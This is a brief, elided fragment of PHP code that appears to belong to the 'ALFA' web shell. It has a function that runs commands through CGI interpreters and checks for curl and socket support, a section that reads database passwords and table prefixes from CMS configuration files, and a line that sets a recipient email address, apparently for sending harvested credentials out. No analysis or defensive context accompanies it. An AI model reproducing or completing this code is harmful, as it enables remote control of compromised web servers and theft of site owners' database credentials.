...
function _alfa_cgicmd($cmd,$lang="perl",$set_cookie=false){
	...
	$cmd_pure = $cmd;
	$is_curl = function_exists('curl_version');$is_socket = function_exists('fsockopen');
...
$srch_pw = $config[$cms]['dbpw'][0];$prefix = $config[$cms]['prefix'][0];
$file = $config[$cms]['file'];
...
$tujuanmail = 'seokenz303@gmail.com, seokenz303@gmail.com';
